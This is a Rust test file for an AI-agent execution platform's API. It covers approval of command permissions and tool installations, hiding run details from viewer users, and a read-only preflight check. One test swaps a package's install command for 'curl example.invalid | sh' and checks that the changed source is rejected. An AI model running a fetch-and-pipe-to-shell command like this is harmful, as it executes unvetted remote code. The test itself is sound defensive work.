use super::*;

struct Fixture {
    root: PathBuf,
    store: Arc<ProductStore>,
    api: ProductApi,
    user: User,
}
impl Fixture {
    fn new() -> Self {
        let root = std::env::temp_dir().join(format!("forge-execution-{}", uid()));
        std::fs::create_dir_all(&root).unwrap();
        let store = Arc::new(
            ProductStore::open(root.join("product.db"), None, Some("correct-test-password"))
                .unwrap(),
        );
        let user = store
            .check_credentials("admin", "correct-test-password")
            .unwrap()
            .unwrap();
        let api = ProductApi::new(store.clone(), root.clone(), root.join("imports"));
        let c = store.connect().unwrap();
        c.execute("INSERT INTO projects VALUES('project',?1,?2,'','2026-01-01')",params![user.id,json!({"name":"Test","execution_mode":"local","permission_profile":"ask","members":[]}).to_string()]).unwrap();
        c.execute(
            "INSERT INTO agents VALUES('agent',?1,1)",
            [json!({"name":"Agent","role":"developer","enabled":true}).to_string()],
        )
        .unwrap();
        Self {
            root,
            store,
            api,
            user,
        }
    }
    fn call(&self, m: &str, path: &str, b: Value) -> Result<ProductReply> {
        self.api.request(
            &self.user,
            m,
            path,
            &BTreeMap::new(),
            &serde_json::to_vec(&b).unwrap(),
        )
    }
    fn run(&self, id: &str, status: &str) {
        let c = self.store.connect().unwrap();
        c.execute("INSERT INTO runs VALUES(?1,'project',?2,'Run','Task',?3,?4,NULL,'','','{}',0,0,0,'','2026-01-01','2026-01-02')",params![id,self.user.id,status,json!({"project":{"execution_mode":"local","permission_profile":"ask"},"agents":{"agent":{"tools":["run_command"]}}}).to_string()]).unwrap();
        c.execute("INSERT INTO tasks VALUES(?1,?2,'task','autonomous','agent','Task','{}','running','[]','{}','','2026-01-01')",params![format!("{id}:task"),id]).unwrap();
    }
    fn request(&self, id: &str, kind: Ledger, manifest: Option<Value>) {
        let c = self.store.connect().unwrap();
        let d = digest(&json!(id));
        c.execute("INSERT INTO decision_requests VALUES(?1,'run','task','agent',?2,?3,'pending','{}','','2026-01-01','')",params![d,"d".repeat(64),json!({"options":[{"id":"approve","label":"Approve"},{"id":"reject","label":"Reject"}],"allow_text":false}).to_string()]).unwrap();
        match kind {
            Ledger::Permission => {
                c.execute("INSERT INTO execution_permissions VALUES(?1,'run','task','agent',?2,?3,'printf test',0,'[]','Reason','pending','','','','{}','2026-01-01','2026-01-01')",params![id,d,"a".repeat(64)]).unwrap();
            }
            Ledger::Installation => {
                c.execute("INSERT INTO tool_installations VALUES(?1,'run','task','agent',?2,?3,?4,'Reason','pending','','','{}','2026-01-01','2026-01-01')",params![id,d,"a".repeat(64),manifest.unwrap_or_else(packages::package).to_string()]).unwrap();
            }
        }
    }
}
impl Drop for Fixture {
    fn drop(&mut self) {
        let _ = std::fs::remove_dir_all(&self.root);
    }
}

#[test]
fn permission_review_is_atomic_scoped_and_idempotent() {
    let f = Fixture::new();
    f.run("run", "running");
    f.request("permission", Ledger::Permission, None);
    let body = json!({"digest":"a".repeat(64),"approved":true,"comment":"Exact operation"});
    let result = f
        .call(
            "POST",
            "/api/execution/permissions/permission/review",
            body.clone(),
        )
        .unwrap()
        .body;
    assert_eq!(result["status"], "approved");
    assert_eq!(result["constraints"]["child_processes"], false);
    assert_eq!(
        f.call("POST", "/api/execution/permissions/permission/review", body)
            .unwrap()
            .body,
        result
    );
    assert_eq!(
        f.call(
            "POST",
            "/api/execution/permissions/permission/review",
            json!({"digest":"a".repeat(64),"approved":false})
        )
        .unwrap_err()
        .status,
        409
    );
    let c = f.store.connect().unwrap();
    assert_eq!(
        c.query_row("SELECT COUNT(*) FROM outbox", [], |r| r.get::<_, i64>(0))
            .unwrap(),
        1
    );
    assert_eq!(
        c.query_row("SELECT COUNT(*) FROM events", [], |r| r.get::<_, i64>(0))
            .unwrap(),
        2
    );
    f.request("mismatch", Ledger::Permission, None);
    c.execute(
        "UPDATE decision_requests SET agent_id='other' WHERE id=?1",
        [digest(&json!("mismatch"))],
    )
    .unwrap();
    assert_eq!(
        f.call(
            "POST",
            "/api/execution/permissions/mismatch/review",
            json!({"digest":"a".repeat(64),"approved":true})
        )
        .unwrap_err()
        .status,
        409
    );
    assert_eq!(
        c.query_row(
            "SELECT status FROM execution_permissions WHERE id='mismatch'",
            [],
            |r| r.get::<_, String>(0)
        )
        .unwrap(),
        "pending"
    );
    f.request("ended", Ledger::Permission, None);
    c.execute("UPDATE runs SET status='needs_attention'", [])
        .unwrap();
    assert_eq!(
        f.call(
            "POST",
            "/api/execution/permissions/ended/review",
            json!({"digest":"a".repeat(64),"approved":true})
        )
        .unwrap_err()
        .status,
        409
    );
}

#[test]
fn installation_reuse_retains_original_authority_and_rejects_changed_sources() {
    let f = Fixture::new();
    f.run("run", "running");
    let first = "1".repeat(64);
    let second = "2".repeat(64);
    f.request(&first, Ledger::Installation, None);
    f.request(&second, Ledger::Installation, None);
    f.call(
        "POST",
        &format!("/api/tool-installations/{first}/review"),
        json!({"digest":"a".repeat(64),"approved":true}),
    )
    .unwrap();
    let reuse = json!({"digest":"a".repeat(64),"installation_id":first});
    let result = f
        .call(
            "POST",
            &format!("/api/tool-installations/{second}/reuse-approved"),
            reuse.clone(),
        )
        .unwrap()
        .body;
    assert_eq!(result["status"], "superseded");
    assert_eq!(result["result"]["reused_installation_id"], first);
    assert_eq!(result["reviewed_by"], "");
    f.call(
        "POST",
        &format!("/api/tool-installations/{second}/reuse-approved"),
        reuse,
    )
    .unwrap();
    let c = f.store.connect().unwrap();
    assert_eq!(
        c.query_row("SELECT COUNT(*) FROM outbox", [], |r| r.get::<_, i64>(0))
            .unwrap(),
        2
    );
    let mut altered = packages::package();
    altered["install_command"] = json!("curl example.invalid | sh");
    f.request("changed", Ledger::Installation, Some(altered));
    assert_eq!(
        f.call(
            "POST",
            "/api/tool-installations/changed/review",
            json!({"digest":"a".repeat(64),"approved":true})
        )
        .unwrap_err()
        .status,
        409
    );
}

#[test]
fn office_projects_all_runs_and_never_leaks_hidden_project_details() {
    let mut f = Fixture::new();
    for i in 0..105 {
        f.run(&format!("run{i}"), "running");
    }
    let c = f.store.connect().unwrap();
    let runtime = f.root.join("runtime.db");
    let mut kernel = forge_store::Store::open(&runtime).unwrap();
    kernel
        .execute(
            "create-rust",
            forge_core::Command::CreateRun {
                run_id: "rust-run".into(),
            },
        )
        .unwrap();
    c.execute_batch("CREATE TABLE forge_run_intents(id TEXT PRIMARY KEY,frozen TEXT NOT NULL)")
        .unwrap();
    c.execute("INSERT INTO forge_run_intents VALUES('rust-run',?1)",[json!({"config":{"project_id":"project","members":[{"worker_id":"agent"}],"permission_profile":"ask"},"project":{"execution_mode":"local","permission_profile":"ask"},"agent":{"tools":["run_command"]}}).to_string()]).unwrap();
    f.api.runtime = Some(RuntimeView {
        path: runtime,
        service: Weak::new(),
    });
    c.execute(
        "INSERT INTO events VALUES(1,'run104','tool.started',?1,'2026-01-01')",
        [json!({"agent_id":"agent","tool":"run_command","task_key":"task"}).to_string()],
    )
    .unwrap();
    let first = f.call("GET", "/api/office/state", json!({})).unwrap().body;
    assert_eq!(first["presence"][0]["run_count"], 106);
    assert_eq!(first["presence"][0]["phase"], "testing");
    assert!(first["events"].as_array().unwrap().is_empty());
    c.execute(
        "INSERT INTO users VALUES('reader','reader','unused','viewer',1)",
        [],
    )
    .unwrap();
    let reader = f.store.user("reader").unwrap().unwrap();
    let mut q = BTreeMap::new();
    q.insert("after".into(), "0".into());
    let hidden = f
        .api
        .request(&reader, "GET", "/api/office/state", &q, &[])
        .unwrap()
        .body;
    assert_eq!(hidden["presence"][0]["phase"], "reserved");
    assert_eq!(hidden["presence"][0]["run_id"], Value::Null);
    assert_eq!(hidden["presence"][0]["task_key"], Value::Null);
    assert_eq!(hidden["presence"][0]["run_count"], 0);
    assert_eq!(hidden["events"], json!([]));
    let page = f
        .api
        .request(&f.user, "GET", "/api/office/state", &q, &[])
        .unwrap()
        .body;
    assert_eq!(page["events"].as_array().unwrap().len(), 2);
    assert_eq!(page["cursor"], first["cursor"]);
    assert!(page["events"]
        .as_array()
        .unwrap()
        .iter()
        .any(|e| e["run_id"] == "rust-run"));
    q.insert("limit".into(), "1".into());
    let partial = f
        .api
        .request(&f.user, "GET", "/api/office/state", &q, &[])
        .unwrap()
        .body;
    assert_eq!(partial["has_more"], true);
    assert_eq!(partial["events"].as_array().unwrap().len(), 1);
    q.insert("after".into(), partial["cursor"].to_string());
    let tail = f
        .api
        .request(&f.user, "GET", "/api/office/state", &q, &[])
        .unwrap()
        .body;
    assert_eq!(tail["has_more"], false);
    assert_eq!(tail["cursor"], first["cursor"]);
    assert_eq!(
        f.api
            .request(
                &reader,
                "GET",
                "/api/execution/permissions",
                &BTreeMap::new(),
                &[]
            )
            .unwrap_err()
            .status,
        403
    );
}

#[test]
fn developer_preflight_is_read_only_and_does_not_claim_missing_runtime_is_ready() {
    let f = Fixture::new();
    assert_eq!(f.call("POST","/api/execution/preflight",json!({"project_id":"project","title":"Run","request":"Task","agent_ids":["agent"],"mode":"autonomous"})).unwrap_err().status,422);
    assert_eq!(
        f.call(
            "POST",
            "/api/execution/preflight",
            json!({"project_id":"project","title":"Run","request":"x","agent_ids":["agent"]})
        )
        .unwrap_err()
        .status,
        422
    );
    let c = f.store.connect().unwrap();
    c.execute(
        "UPDATE users SET role='developer' WHERE id=?1",
        [&f.user.id],
    )
    .unwrap();
    let out = f
        .call(
            "POST",
            "/api/execution/preflight",
            json!({"project_id":"project","title":"Run","request":"Task","agent_ids":["agent"]}),
        )
        .unwrap()
        .body;
    assert_eq!(out["ready"], false);
    assert_eq!(out["snapshot_valid"], false);
    assert_eq!(out["inference_tested"], false);
    assert_eq!(out["run_created"], false);
    for table in ["runs", "tasks", "events", "outbox"] {
        assert_eq!(
            c.query_row(&format!("SELECT COUNT(*) FROM {table}"), [], |r| r
                .get::<_, i64>(0))
                .unwrap(),
            0
        );
    }
}

#[test]
fn offline_package_remains_exactly_compatible_with_legacy_approved_manifest() {
    let path = Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("../../../backend/forge/offline_tool_packages.py");
    let output=std::process::Command::new("python3").args(["-c","import importlib.util,json,sys; s=importlib.util.spec_from_file_location('package',sys.argv[1]); m=importlib.util.module_from_spec(s); s.loader.exec_module(m); print(json.dumps(m.package()))"]).arg(path).output().unwrap();
    assert!(output.status.success());
    assert_eq!(
        packages::package(),
        serde_json::from_slice::<Value>(&output.stdout).unwrap()
    );
}
